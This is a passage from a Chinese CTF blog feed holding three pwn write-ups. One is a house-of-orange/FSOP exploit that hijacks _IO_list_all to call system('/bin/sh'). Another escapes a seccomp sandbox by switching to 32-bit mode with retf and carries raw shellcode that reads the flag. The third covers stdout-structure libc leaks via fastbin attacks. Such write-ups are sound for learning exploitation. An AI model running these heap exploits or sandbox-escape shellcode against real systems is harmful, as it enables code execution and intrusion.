<h5 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h5><p>house of orange利用过程中，最后程序触发abort刷新流的原因是在unsorted bin attack打完之后 在第二次遍历unsorted bin给堆块分类的时候 由于unsorted bin已经被破坏，然后victim已经是一个libc地址(在下面的这张图片该地址是io_list_all-0x10的地址，这个地址也就是我们篡改bk指针的值)，而其对应的size位是0，从而没有通过检查(如下)，最终触发了abort</p>
<p><img src="/../img/image-20221019205258333.png" alt="image-20221019205258333"></p>
<p><img src="/../img/image-20221019205404478.png" alt="image-20221019205404478"></p>
<h4 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h4><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">d_d=<span class="number">0x400DEE</span></span><br><span class="line">d_a=<span class="number">0x13FD</span></span><br><span class="line">d_e=<span class="number">0x1415</span></span><br><span class="line">d_s=<span class="number">0x1409</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/home/hacker/Desktop/buu64-libc-2.23.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice : &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Length of name :&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Name :&#x27;</span>,content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Price of Orange:&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Color of Orange:&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice : &#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Length of name :&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Name:&#x27;</span>,content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Price of Orange:&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Color of Orange:&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;4.show\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice : &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    edit(<span class="number">0x40</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0x0000002000000001</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0xfa1</span>))</span><br><span class="line">    add(<span class="number">0x1000</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x400</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    show()</span><br><span class="line">    leak_libc=recv_libc()</span><br><span class="line">    libc_base=leak_libc-<span class="number">0x3c5188</span></span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">    io_list_all=libc_base+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">    sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    edit(<span class="number">0x20</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    </span><br><span class="line">    show()</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;e&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    leak_heap=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    log_addr(<span class="string">&#x27;leak_heap&#x27;</span>)</span><br><span class="line">    <span class="comment">#debug(p,&#x27;pie&#x27;,d_e,d_a,d_s)</span></span><br><span class="line">    payload=<span class="string">b&#x27;f&#x27;</span>*<span class="number">0x400</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    payload+=p64(sys_addr)+p64(<span class="number">0</span>)</span><br><span class="line">    payload+=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>) <span class="comment">#old top chunk prev_size &amp; size 同时也是fake file的_flags字段</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)+p64(io_list_all-<span class="number">0x10</span>) <span class="comment">#old top chunk fd &amp; bk</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)<span class="comment">#_IO_write_base &amp; _IO_write_ptr</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">    payload+=p64(leak_heap+<span class="number">0x430</span>)<span class="comment">#chain</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)*<span class="number">13</span></span><br><span class="line">    payload+=p64(leak_heap+<span class="number">0x508</span>)</span><br><span class="line">    payload+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(sys_addr)</span><br><span class="line">    edit(<span class="number">0x1000</span>,payload)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice : &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.interactive()</span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>

<p><img src="/../img/image-20221007234548743.png" alt="image-20221007234548743"></p>
<h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a href="https://www.anquanke.com/post/id/218887#h3-5">House of orange - 安全客，安全资讯平台 (anquanke.com)</a></p>
<p><a href="https://blog.csdn.net/qq_45595732/article/details/110173579">(41条消息) FSOP_TTYflag的博客-CSDN博客</a></p>
<p>[]<a href="https://bbs.pediy.com/thread-272098.htm#msg_header_h3_16">原创] CTF 中 glibc堆利用 及 IO_FILE 总结-Pwn-看雪论坛-安全社区|安全招聘|bbs.pediy.com</a></p>
<p><a href="https://www.cnblogs.com/LynneHuan/p/14696780.html#houseoforange_hitcon_2016">houseoforange_hitcon_2016 - LynneHuan - 博客园 (cnblogs.com)</a></p>
<p><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-orange/">House of Orange - CTF Wiki (ctf-wiki.org)</a></p>
]]></content>
      <categories>
        <category>学习总结</category>
      </categories>
      <tags>
        <tag>FSOP</tag>
        <tag>house of orange</tag>
        <tag>unsorted bin attack</tag>
      </tags>
  </entry>
  <entry>
    <title>沙箱逃逸----切换进程工作模式绕过</title>
    <url>/posts/cb4bda90.html</url>
    <content><![CDATA[<p>这两天打 <strong>CSAW</strong> 又学到了一种新的沙箱逃逸的方法–切换进程的工作模式，使用32位的系统调用号执行系统调用，来绕过原本沙箱禁用掉的系统调用。理解起来倒也不难，但是有几个点需要注意一下，这里详细的记录下利用过程。</p>
<span id="more"></span>



<h2 id="利用过程-amp-amp-调试"><a href="#利用过程-amp-amp-调试" class="headerlink" title="利用过程&amp;&amp;调试"></a>利用过程&amp;&amp;调试</h2><p>先看下程序逻辑(如下)，就是输入数据，然后将其执行。在执行前开启了沙箱保护。</p>
<p><img src="/../img/2706180-20220912231002326-165259550.png"></p>
<p>我们看一下本题沙箱禁用的系统调用(如下图)，我们发现没法执行execve，同时禁用了openat和open这两个系统调用，这就意味着orw和execve两种拿到flag的方式都无法使用了。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011757745.png" alt="image-20230701175707593"></p>
<p>这里我们利用一种新的思路来进行沙箱逃逸，观察上图的禁用规则，我们发现并没有检查架构。如果正常检查架构的沙箱规则应该如下：</p>
<p><img src="/../img/2706180-20220912231025985-268851744.png"></p>
<h3 id="控制cs寄存器"><a href="#控制cs寄存器" class="headerlink" title="控制cs寄存器"></a>控制cs寄存器</h3><p>而retf这个指令是相当于pop ip；pop cs</p>
<p>而在x64系统下，进程有两种工作模式(32位工作模式和64位工作模式)。决定了是哪种工作模式的是cs寄存器**(cs&#x3D;0x23 则为32位工作模式，cs&#x3D;0x33 则为64位工作模式)<strong>，如上所说，我们可以用retf指令来控制cs寄存器。而这里要注意，因为我们切换的是32位工作模式，</strong>因此这里的ip寄存器应该是eip寄存器，而cs寄存器本身也是四字节，所以我们想要往eip和cs寄存器填充的两个值一共应该是八字节数据，共占用一个64位程序下的内存单元才对**。</p>
<h3 id="映射小于等于四字节地址"><a href="#映射小于等于四字节地址" class="headerlink" title="映射小于等于四字节地址"></a>映射小于等于四字节地址</h3><p>但是有一点如果切换到32位工作模式后，那寄存器用的则是32位寄存器，原本64位寄存器里装的6字节地址就无法正常使用了，因此在这之前我们需要调用mmap映射一段小于等于四字节的可读可写可执行的内存地址空间，然后我们将执行流迁移到这片区域上，因为地址小于等于四字节放到32位寄存器中也是ok的。</p>
<p><img src="/../img/2706180-20220912231042351-1607796039.png"></p>
<p>上图是执行mmap映射了一段可读可写可执行的区域，下图是执行系统调用read将数据写到刚刚映射出来的这段区域</p>
<p><img src="/../img/2706180-20220912231052458-225522993.png"></p>
<h3 id="切换进程的工作模式"><a href="#切换进程的工作模式" class="headerlink" title="切换进程的工作模式"></a>切换进程的工作模式</h3><p>切换进程的工作模式其实就是用retf指令来控制cs寄存器，不过需要注意的是我们将执行流迁移到新映射的内存区后，将<strong>栈也迁移过来</strong>(因为原本的栈地址是6字节的，我们切换到32位工作模式后无法再访问原本的栈)。<strong>迁移栈的地方要和映射的起始区域错开</strong>，不能将栈进行新的迁移后，执行push时干扰到我们原本布置的指令。</p>
<p>首先是先布置一下eip和cs的数据，先push到栈里(这里一定要注意是二者共用一个内存单元，一个值仅仅占四字节)，举个例子，比如我映射了一段0x100000的内存区域，然后要切换到32位的工作模式上，那么我压入的数据应该是0x2300100000（因为要迁移执行流，所以给eip寄存器的是0x100000）(如下图)</p>
<p><img src="/../img/2706180-20220912231102480-775571867.png"></p>
<p>下图是已经执行了retf，切换到了32位工作模式。(我们观察下面的栈也可以看出来，执行后的栈已经无法使用了，对比上面正常的栈，发现只保留了4字节，这就说明已经切换了32位工作模式)</p>
<p><img src="/../img/2706180-20220912231725874-1239549974.png"></p>
<p>最后就是记得把栈给迁移过来(如下)</p>
<p><img src="/../img/2706180-20220912231124110-1797761142.png"></p>
<h3 id="orw获取flag"><a href="#orw获取flag" class="headerlink" title="orw获取flag"></a>orw获取flag</h3><p>然后打一个常规的32位orw即可。（如下）</p>
<p><img src="/../img/2706180-20220912231132815-1193419232.png"></p>
<h3 id="执行32位下的execve的报错"><a href="#执行32位下的execve的报错" class="headerlink" title="执行32位下的execve的报错"></a>执行32位下的execve的报错</h3><p>最终正常执行我们的32位程序中的系统调用即可，这里要注意一下，我们还是无法执行execve获取shell，因为execve(“&#x2F;bin&#x2F;sh”,0,0)其实是去运行了&#x2F;bin&#x2F;sh这个程序，而这个程序的位数是跟系统一样的。如果是64位系统，那么&#x2F;bin&#x2F;sh这个程序就是64位的(依旧绕不过沙箱)，这样就导致了我们虽然是工作模式切换过来了，但是后续执行&#x2F;bin&#x2F;sh的时候报错了。</p>
<p>执行32位中的execve情况如下：</p>
<p><img src="/../img/2706180-20220912231141493-2079768539.png"></p>
<p>这里要解释一下图中看的明明是执行的munmap，这是因为工作模式虽然切换到32位了，但是这个gdb调试到这里，它依然认为这个系统调用号是64位的，所以就显示了munmap，不过现在确实执行的是32位中的execve系统调用。</p>
<p>可以看见红框里的报错提示，首先第一行我们确实是成功执行了execve(“&#x2F;bin&#x2F;sh”,0,0)，创建了新的进程&#x2F;usr&#x2F;bin&#x2F;dash</p>
<p>但是第二行就报了一个错误，说是Bad system call。这就说明执行了64位的系统调用，然后被沙箱给禁用了。这也就验证了上面所说的&#x2F;bin&#x2F;sh这个程序就是64位的(依旧绕不过沙箱)。</p>
<p>因此我们依旧只能用orw读出flag。</p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;chal3&#x27;</span>)</span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line">shellcode=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov    rax,0x9</span></span><br><span class="line"><span class="string">mov    rsi,0x5000</span></span><br><span class="line"><span class="string">mov    rdi,0x100000</span></span><br><span class="line"><span class="string">mov    rdx,0x7</span></span><br><span class="line"><span class="string">mov    r10,0x21</span></span><br><span class="line"><span class="string">xor    r8,r8</span></span><br><span class="line"><span class="string">xor    r9,r9</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov    rsi,rdi</span></span><br><span class="line"><span class="string">xor    rdi,rdi</span></span><br><span class="line"><span class="string">xor    rax,rax</span></span><br><span class="line"><span class="string">mov    rdx,0x100</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">movabs r8,0x2300100000</span></span><br><span class="line"><span class="string">push   r8</span></span><br><span class="line"><span class="string">retf</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">s=<span class="string">&quot;\x48\xC7\xC0\x09\x00\x00\x00\x48\xC7\xC6\x00\x50\x00\x00\x48\xC7\xC7\x00\x00\x10\x00\x48\xC7\xC2\x07\x00\x00\x00\x49\xC7\xC2\x21\x00\x00\x00\x4D\x31\xC0\x4D\x31\xC9\x0F\x05\x48\x89\xFE\x48\x31\xFF\x48\x31\xC0\x48\xC7\xC2\x00\x01\x00\x00\x0F\x05\x49\xB8\x00\x00\x10\x00\x23\x00\x00\x00\x41\x50\xCB&quot;</span></span><br><span class="line">p.sendline(s)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">orw=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov    esp,0x100100</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push   0x0</span></span><br><span class="line"><span class="string">push   0x67616c66</span></span><br><span class="line"><span class="string">push   rsp</span></span><br><span class="line"><span class="string">pop    rbx</span></span><br><span class="line"><span class="string">xor    ecx,ecx</span></span><br><span class="line"><span class="string">push   0x5</span></span><br><span class="line"><span class="string">pop    rax</span></span><br><span class="line"><span class="string">int    0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push   rax</span></span><br><span class="line"><span class="string">pop    rbx</span></span><br><span class="line"><span class="string">push   rsp</span></span><br><span class="line"><span class="string">pop    rcx</span></span><br><span class="line"><span class="string">push   0x4000</span></span><br><span class="line"><span class="string">pop    rdx</span></span><br><span class="line"><span class="string">push   0x3</span></span><br><span class="line"><span class="string">pop    rax</span></span><br><span class="line"><span class="string">int    0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push   0x1</span></span><br><span class="line"><span class="string">pop    rbx</span></span><br><span class="line"><span class="string">push   rsp</span></span><br><span class="line"><span class="string">pop    rcx</span></span><br><span class="line"><span class="string">push   0x4000</span></span><br><span class="line"><span class="string">pop    rdx</span></span><br><span class="line"><span class="string">push   0x4</span></span><br><span class="line"><span class="string">pop    rax</span></span><br><span class="line"><span class="string">int    0x80</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">o=<span class="string">&quot;\xBC\x00\x01\x10\x00\x6A\x00\x68\x66\x6C\x61\x67\x54\x5B\x31\xC9\x6A\x05\x58\xCD\x80\x50\x5B\x54\x59\x68\x00\x40\x00\x00\x5A\x6A\x03\x58\xCD\x80\x6A\x01\x5B\x54\x59\x68\x00\x40\x00\x00\x5A\x6A\x04\x58\xCD\x80\xB8\x01\x00\x00\x00\xCD\x80&quot;</span></span><br><span class="line">p.sendline(o)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a href="https://www.cnblogs.com/vi0let/articles/15978203.html">特殊情况下sandbox的bypass - vi0let - 博客园 (cnblogs.com)</a></p>
<p><a href="https://www.jianshu.com/p/4a0a70ddec37">32位64位交叉编码 - 简书 (jianshu.com)</a></p>
<h2 id="题目附件："><a href="#题目附件：" class="headerlink" title="题目附件："></a>题目附件：</h2><p>链接：<a href="https://pan.baidu.com/s/1NXZ8zk2CsqUwwkua5QvoFA?pwd=7gt0">https://pan.baidu.com/s/1NXZ8zk2CsqUwwkua5QvoFA?pwd=7gt0</a><br>提取码：7gt0</p>
]]></content>
      <categories>
        <category>学习总结</category>
      </categories>
      <tags>
        <tag>沙箱逃逸</tag>
      </tags>
  </entry>
  <entry>
    <title>关于IO leak的学习总结</title>
    <url>/posts/a9dd00f0.html</url>
    <content><![CDATA[<h1 id="io-leak"><a href="#io-leak" class="headerlink" title="io leak"></a>io leak</h1><blockquote>
<p>大致原理：</p>
<p>通过篡改_IO_2_1_stdout_结构体中的flags字段和_IO_write_base字段，通过篡改flags字段来绕过一些检查，通过篡改_IO_write_base字段使得系统调用write打印_IO_write_base字段与_IO_write_ptr字段之间的内容泄露出libc地址。</p>
<p>使用前提：</p>
<p>1、程序没有show函数</p>
<p>2、开启了FULL RELRO保护</p>
<p>利用过程：</p>
<p>1、想办法将_IO_2_1_stdout_结构体申请出来。</p>
<p>2、往_IO_2_1_stdout_结构体写入构造好的数据(具体是什么下面会说)。</p>
<p>3、执行任意一个puts函数，就可以将libc地址泄露出来。</p>
</blockquote>
<span id="more"></span>

<h2 id="第一步–申请"><a href="#第一步–申请" class="headerlink" title="第一步–申请"></a>第一步–申请</h2><p>在不同的libc版本，申请时也有略微的区别。</p>
<h3 id="不同libc版本对于stdout结构体的申请"><a href="#不同libc版本对于stdout结构体的申请" class="headerlink" title="不同libc版本对于stdout结构体的申请"></a>不同libc版本对于stdout结构体的申请</h3><p>先说2.27和2.31这两个版本，因为在这两个版本时，没有针对tcachebin的fd指针进行相关保护。就导致了tcache poisoning修改其fd指针就可以直接将堆块申请出来。所以我们只要能控制fd指针，就可以直接将_IO_2_1_stdout_结构体(之后统称为stdout结构体)申请出来。</p>
<p>而在2.23的libc版本中，从fastbin中申请堆块是对size位进行了检查。而我们能伪造size通过检查的地址只有malloc_hook-0x23和stdout结构体地址-0x43这两处。不过还好我们依然可以通过伪造size将stdout结构体申请出来。因此只要能控制fastbin中的fd指针，问题依然不大。</p>
<p>PS：为什么只有2.23 2.27 2.31这三个版本的libc。淦，因为目前只练习了这三个版本的io leak。</p>
<h3 id="爆破一比特申请stdout结构体"><a href="#爆破一比特申请stdout结构体" class="headerlink" title="爆破一比特申请stdout结构体"></a>爆破一比特申请stdout结构体</h3><p>但上面这两种情况都没有考虑到一个问题，就是使用io leak的时候，肯定我们是没有libc地址的，那我们就无法直接将tcachebin或者fastbin的fd指针修改为stdout结构体地址。对此我们采用的策略是利用unsorted bin中的fd指针进行利用。因为unsorted bin中的fd指针指向了的是main arena+88或者main arena+96的位置，这里位于libc中。如果这个地址能出现在fastbin或者tcachebin中fd的位置，且我们可以对fd指针进行编辑，那我们就可以将其修改为stdout结构体地址(stdout结构体地址的后三位是固定的，但是倒数第四位会因为ASLR的原因而随机化，可我们只能写入两字节，无法写入一个半字节，因此倒数第四位只能通过爆破来预测)。</p>
<h3 id="如何在fastbin或者tcachebin中留下unsorted-bin中的fd指针？具体情况，具体分析"><a href="#如何在fastbin或者tcachebin中留下unsorted-bin中的fd指针？具体情况，具体分析" class="headerlink" title="如何在fastbin或者tcachebin中留下unsorted bin中的fd指针？具体情况，具体分析"></a>如何在fastbin或者tcachebin中留下unsorted bin中的fd指针？具体情况，具体分析</h3><p>而如何让unsorted bin中的fd指针出现在fastbin或者tcachebin中的fd的位置，这就属于八仙过海各显神通了，不同题目的思路都不一样。这里就具体题目具体分析吧。</p>
<h2 id="第二步–编辑"><a href="#第二步–编辑" class="headerlink" title="第二步–编辑"></a>第二步–编辑</h2><p>将stdout结构体申请出来后，正常情况下是可以往里面写入数据的。</p>
<p>我们需要<strong>覆盖stdout结构体中的_flags字段为0xfbad1887，并且覆盖_IO_read_ptr、_IO_read_end、_IO_read_base这三个指针为0，最后覆盖_IO_write_base指针的最后一字节为00</strong>(这里并不是非要为00，因为到时候puts函数会泄露_IO_write_base指针与_IO_write_ptr指针之间的所有数据，只要将_IO_write_base指针改的小于_IO_write_ptr指针并且确定这二者之间存在libc地址，那么都是可以的，只不过我通常将其覆盖为\x00)</p>
<p>至于为什么要将_flags字段改为0xfbad1887这个值，是因为这个字段的各个比特位都属于标志位，不同比特位存在的意义不同，能绕过的检查也不同。而将_flags字段改为0xfbad1887这个值，正好可以绕过阻止我们完成io leak的所有检查(具体是哪些检查又或者如何绕过的，可以去网上看一下其他师傅的博客，当时感觉师傅们写的很全并且很好，我就没再去单独写了)，然后read那三个指针，我试了一下，他们的值无所谓(不一定非要写成00)。</p>
<p>编辑后stdout结构体如下：</p>
<p><img src="/../img/2706180-20220826111011178-1206554709.png"></p>
<h2 id="第三步–泄露"><a href="#第三步–泄露" class="headerlink" title="第三步–泄露"></a>第三步–泄露</h2><p>emmm，前两步都完成的话，第三步执行puts函数时顺其自然就泄露了libc地址，这个就没啥好说的了。</p>
<h1 id="题目练习"><a href="#题目练习" class="headerlink" title="题目练习"></a>题目练习</h1><h2 id="de1ctf-2019-weapon"><a href="#de1ctf-2019-weapon" class="headerlink" title="de1ctf_2019_weapon"></a>de1ctf_2019_weapon</h2><h3 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h3><p><img src="/../img/2706180-20220826111041719-1027187867.png"></p>
<h3 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h3><p><img src="/../img/2706180-20220826111054199-1620326152.png"></p>
<p>delete函数中存在UAF漏洞。</p>
<h3 id="大致思路："><a href="#大致思路：" class="headerlink" title="大致思路："></a>大致思路：</h3><p>在2.23的libc中的话，可以利用UAF打一个double free。利用edit函数的话再打一个fastbin attack。_IO_2_1_stdout结构体上方和__malloc_hook上方都有一个0x7f(这个具体的要求就是有一个0x7f开头的地址，然后该地址的下一个内存单元为NULL)，可以去利用fastbin attack从这里申请出来一个fake chunk，最终可以泄露libc地址或者劫持hook获取shell。</p>
<h4 id="伪造size，将chunk释放到unsorted-bin中"><a href="#伪造size，将chunk释放到unsorted-bin中" class="headerlink" title="伪造size，将chunk释放到unsorted bin中"></a>伪造size，将chunk释放到unsorted bin中</h4><p>由于这道题无法申请超过0x60的chunk，因此我们的正常chunk被释放掉无法进入unsorted bin中，所以需要先打一个fastbin attack将一个fake_chunk申请到某个堆块的size位上方，然后通过edit函数来篡改其size位。放入unsorted bin中的原因是因为我们无法泄露libc地址，因此无法直接拿到_IO_2_1_stdout结构体的地址，只能利用unsorted bin中的fd指针main_arena+88这个libc地址，通过篡改其后四比特位(最后三位是固定的，倒数第四位需要爆破)来获取_IO_2_1_stdout结构体上方的地址。</p>
<p>这部分脚本如下:</p>
<p>就是先打一个fastbin attack，然后申请出来fake chunk，篡改一个chunk的size即可。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">8</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="number">7</span>,<span class="string">&#x27;prevent_chunk&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;\x50&#x27;</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,d_a,d_d,d_e,<span class="number">0xB35</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">5</span>,p64(<span class="number">0</span>)*<span class="number">9</span>+p64(<span class="number">0x71</span>))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">6</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0xe1</span>))</span><br></pre></td></tr></table></figure>

<p>下图已经篡改成功：</p>
<p><img src="/../img/2706180-20220826111117610-1516022746.png"></p>
<h4 id="将unsorted-bin中的堆块放入fastbin中"><a href="#将unsorted-bin中的堆块放入fastbin中" class="headerlink" title="将unsorted bin中的堆块放入fastbin中"></a>将unsorted bin中的堆块放入fastbin中</h4><p>因为需要打fastbin attack将main_arena+88这个地址进行篡改，所以要先把unsorted bin中的堆块放入fastbin中，想实现这个的话，还是用fastbin attack进行操作。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">1</span>)#将大堆块释放，使其进入unsorted bin中</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,d_a,d_d,d_e)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">8</span>,<span class="string">&#x27;\x70&#x27;</span>)#将unsorted bin中的堆块篡改到fast bin上</span><br></pre></td></tr></table></figure>

<p>上述代码实现将unsorted bin中的堆块放入fast bin中。</p>
<p>下图为修改前的bins情况<br><img src="/../img/2706180-20220826111157348-1189507279.png"></p>
<p>下图为修改后的bins情况</p>
<p><img src="/../img/2706180-20220826111208472-424079904.png"></p>
<h4 id="爆破一比特位，将fake-chunk申请到stdout结构体上方"><a href="#爆破一比特位，将fake-chunk申请到stdout结构体上方" class="headerlink" title="爆破一比特位，将fake_chunk申请到stdout结构体上方"></a>爆破一比特位，将fake_chunk申请到stdout结构体上方</h4><p>由于我们的fake_chunk进入了fast bin中，但是其size是之前被伪造过的0xe1，要想从fastbin中再申请出来还需要再改回去。同时需要打fastbin attack将fake_chunk申请到stdout结构体上方，这个地址是在&amp;_IO_2_1_stdout_-0x43的位置，因为我们需要一个地址是0x7f开头，同时下一个内存单元为0的地址。</p>
<p>如下图这里就是符合条件的地方：</p>
<p><img src="/../img/2706180-20220826111255470-1590182798.png"></p>
<p>经过计算发现该stdout结构体地址-0x43的位置成功伪造了size</p>
<p><img src="/../img/2706180-20220826111308632-2123238392.png"></p>
<p>而这个地址的后三位是固定的，倒数第四位是随机的 ，但是我们只能写两字节因此第四位必须要去爆破。(在调试的时候关闭ASLR就无需爆破了，等脚本写完了再去写爆破部分)</p>
<p>然后fake_chunk申请到stdout结构体上方后，我们去改变结构体的_flags字段和_IO_write_base字段(具体原理的话可以看这篇<a href="https://www.cnblogs.com/pwnfeifei/p/15793432.html">文章</a>)，等再次调用puts函数的时候，我们就可以获取libc基地址了（需要注意的是将_flags字段改成0xfbad1880，之后的puts都不会再加\n了，因此要处理一下接收部分。不过用0xfbad1887就是正常的）。</p>
<p>这部分exp中的代码如下：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">6</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x71</span>)+<span class="string">b&#x27;\xdd\x25&#x27;</span>)<span class="comment">#伪造0x71的size，使其通过fast bin的检查,伪造fake chunk到stdout结构体上方(需要爆破一位)</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">9</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#将fastbin中的堆块申请出去，打fastbin attack</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">11</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>)<span class="comment">#篡改结构体中的字段</span></span><br><span class="line">leak_libc=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure>



